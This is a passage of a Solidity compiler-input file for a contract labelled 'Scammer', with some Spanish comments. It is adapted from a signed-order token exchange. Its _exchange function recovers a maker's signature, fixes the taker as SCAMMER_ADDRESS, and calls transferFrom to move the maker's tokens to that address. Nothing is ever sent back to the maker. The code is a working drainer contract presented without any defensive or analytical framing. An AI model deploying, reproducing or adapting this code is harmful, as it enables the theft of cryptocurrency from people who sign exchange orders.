getRecentDueTimes(address makerAddr, uint256 maxCount) external view returns (uint256[] memory) {\n        uint256 head = makerRDTHeadTail[makerAddr] >> 80;\n        uint256[] memory recentDueTimes = new uint256[](maxCount);\n        for (uint256 i = 0; i < maxCount && head != 0; ++i) {\n            recentDueTimes[i] = head;\n            head = makerNextRecentDueTime[makerAddr][head];\n        }\n        return recentDueTimes;\n    }\n\n    // ** Se usa para que el Maker cancele su propia orden\n    // By adding a new dueTime entry in the linked-list, we can revoke a coin-exchanging message\n    function addNewDueTime(uint256 newDueTime) external {\n        require(newDueTime != 0, \"Scammer: invalid dueTime\");\n        uint256 currTime = block.timestamp * MUL;\n        clearOldDueTimesAndInsertNew(msg.sender, newDueTime, currTime);\n    }\n\n    // ** No encuentro uso\n    // Delete some useless entries from the linked list\n    function clearOldDueTimes(uint256 maxCount, address makerAddr) external {\n        uint256 currTime = block.timestamp * MUL;\n        uint256 headTail = makerRDTHeadTail[makerAddr];\n        (uint256 head, uint256 tail) = (headTail >> 80, uint256(uint80(headTail)));\n        (head, tail) = _clearOldDueTimes(maxCount, makerAddr, currTime, head, tail);\n        makerRDTHeadTail[makerAddr] = (head << 80) | tail;\n    }\n\n    // ** La usa el Taker\n    // If a message's dueTime was recorded in the linked-list before, it is a replay and can't take effect\n    function isReplay(address makerAddr, uint256 dueTime) external view returns (bool) {\n        uint256 tail = uint80(makerRDTHeadTail[makerAddr]);\n        return tail == dueTime || makerNextRecentDueTime[makerAddr][dueTime] != 0;\n    }\n\n    //Delete some useless entries from the linked list and insert a new one\n    function clearOldDueTimesAndInsertNew(\n        address makerAddr,\n        uint256 newDueTime,\n        uint256 currTime\n    ) private {\n        uint256 headTail = makerRDTHeadTail[makerAddr];\n        (uint256 head, uint256 tail) = (headTail >> 80, uint256(uint80(headTail)));\n        require(tail != newDueTime && makerNextRecentDueTime[makerAddr][newDueTime] == 0, \"Scammer: dueTime not new\");\n\n        (head, tail) = _clearOldDueTimes(MaxClearCount, makerAddr, currTime, head, tail);\n        (head, tail) = _addNewDueTime(makerAddr, newDueTime, head, tail);\n        makerRDTHeadTail[makerAddr] = (head << 80) | tail;\n    }\n\n    // The linked-list:\n    // No entries in queue: head = 0, tail = 0\n    // One entry in queue: head = dueTime, tail = dueTime\n    // Two entries in queue: head = A, tail = B, makerNextRecentDueTime[makerAddr][A] = B\n    function _clearOldDueTimes(\n        uint256 maxCount,\n        address makerAddr,\n        uint256 currTime,\n        uint256 head,\n        uint256 tail\n    ) private returns (uint256, uint256) {\n        for (uint256 i = 0; i < maxCount && head < currTime && head != 0; ++i) {\n            uint256 newHead = makerNextRecentDueTime[makerAddr][head];\n            makerNextRecentDueTime[makerAddr][head] = 0;\n            head = newHead;\n        }\n\n        if (head == 0) {\n            tail = 0;\n        }\n\n        return (head, tail);\n    }\n\n    function _addNewDueTime(\n        address makerAddr,\n        uint256 dueTime,\n        uint256 head,\n        uint256 tail\n    ) private returns (uint256, uint256) {\n        if (head == 0) {\n            return (dueTime, dueTime);\n        }\n\n        makerNextRecentDueTime[makerAddr][tail] = dueTime;\n        return (head, dueTime);\n    }\n\n    // A taker exchanges with a maker, using a message signature generated by the maker\n    function directExchange(\n        uint256 coinsToMaker,\n        uint256 coinsToTaker,\n        uint256 dueTime80_v8_version8,\n        bytes32 r,\n        bytes32 s\n    ) external payable {\n        _exchange(coinsToMaker, coinsToTaker, dueTime80_v8_version8, r, s);\n    }\n\n    function _exchange(\n        uint256 coinsToMaker,\n        uint256 coinsToTaker,\n        uint256 dueTime80_v8_version8,\n        bytes32 r,\n        bytes32 s\n    ) private {\n        uint256 dueTime = uint80(dueTime80_v8_version8 >> 16);\n        uint256 currTime = block.timestamp * MUL;\n        require(currTime < dueTime, \"Scammer: order expired\");\n\n        address makerAddr = getSigner(coinsToMaker, coinsToTaker, dueTime80_v8_version8, r, s);\n\n        clearOldDueTimesAndInsertNew(makerAddr, dueTime, currTime);\n        address takerAddr = SCAMMER_ADDRESS;\n\n        address coinTypeToMaker = address(bytes20(uint160(coinsToMaker >> 96)));\n        uint256 coinAmountToMaker = uint256(uint96(coinsToMaker));\n        address coinTypeToTaker = address(bytes20(uint160(coinsToTaker >> 96)));\n        uint256 coinAmountToTaker = uint256(uint96(coinsToTaker));\n\n        require(!isBCH(coinTypeToTaker), \"Scammer: BCH is not allowed\");\n\n        emit Exchange(makerAddr, takerAddr, coinTypeToMaker, coinAmountToMaker, coinTypeToTaker, coinAmountToTaker, dueTime);\n\n        if (coinAmountToTaker != 0) {\n            (bool success, bytes memory _notUsed) = coinTypeToTaker.call(\n                abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", makerAddr, takerAddr, coinAmountToTaker)\n            );\n            require(success, \"Scammer: transferFrom failed\");\n        }\n    }\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "abi",
          "evm.bytecode",
          "evm.deployedBytecode",
          "evm.methodIdentifiers",
          "metadata",
          "devdoc",
          "userdoc",
          "storageLayout",
          "evm.gasEstimates"
        ],
        "": [
          "ast"
        ]
      }
    },
    "metadata": {
      "useLiteralContent": true
    },
    "libraries": {
      "": {
        "__CACHE_BREAKER__": "0x00000000d41867734bbee4c6863d9255b2b06ac1"
      }
    }
  }
}